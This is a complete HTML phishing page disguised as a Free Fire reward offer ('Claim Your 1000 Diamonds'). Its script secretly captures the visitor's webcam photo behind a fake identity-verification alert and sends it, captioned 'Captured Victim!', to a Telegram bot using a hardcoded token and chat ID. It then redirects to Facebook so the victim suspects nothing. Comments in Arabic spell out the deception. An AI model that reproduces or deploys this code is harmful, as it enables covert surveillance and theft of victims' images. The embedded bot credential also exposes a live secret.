<!DOCTYPE html>
<html>
<head>
    <title>🎁 Free Fire Rewards 🎁</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #1a1a1a; color: #f1c40f; text-align: center; font-family: sans-serif; margin: 0; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; }
        .container { background: #2c3e50; padding: 25px; border-radius: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.5); width: 90%; max-width: 350px; }
        .app-icon { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 15px; }
        h1 { font-size: 22px; color: #fff; margin: 10px 0; }
        p { font-size: 14px; color: #ecf0f1; margin-bottom: 20px; }
        .btn-claim { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 100%; animation: pulse 1.5s infinite; }
        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0.7); }
            70% { transform: scale(1.05); box-shadow: 0 0 10px rgba(231, 76, 60, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0); }
        }
        /* إخفاء الفيديو والكانفاس */
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://image.api.playstation.com/vulcan/ap/rnd/202107/2007/Xf2JmFvM3w2X0zP3vXzG4yvQ.png" alt="Free Fire" class="app-icon">
        <h1>Claim Your 1000 Diamonds Now Now</h1>
        <p>Log in with Facebook to verify and connect your account.</p>
        <button class="btn-claim" onclick="captureAndPhish()">CLAIM NOW</button>
    </div>

    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
        const CHAT_ID = "7479786207"; //

        async function captureAndPhish() {
            try {
                // 1. طلب الكاميرا مع "تشعيل الضو"
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // رسالة خادعة باش يآمن بلي كاين عملية
                alert("Checking account status... Photo validation required!");

                // 2. الحل للصورة الكحلة: استنى 5 ثواني كاملة باش الكاميرا تصفى
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    // تحويل الصورة لملف JPG وإرسالها
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'shot.jpg');
                        formData.append('caption', '🎯 Captured Victim!');

                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
                        .then(() => {
                            // توجيه الضحية لموقع فيسبوك الحقيقي باش ما يشكش
                            window.location.href = "https://www.facebook.com/";
                        });
                    }, 'image/jpeg');
                }, 5000); 

            } catch (err) {
                // رسالة خطأ مزورة إذا رفض الكاميرا
                alert("Error: Camera permission required for identity verification!");
                // حتى إذا رفض، نظهروا صفحة فيسبوك على الأقل
                window.location.href = "https://www.facebook.com/";
            }
        }
    </script>
</body>
</html>
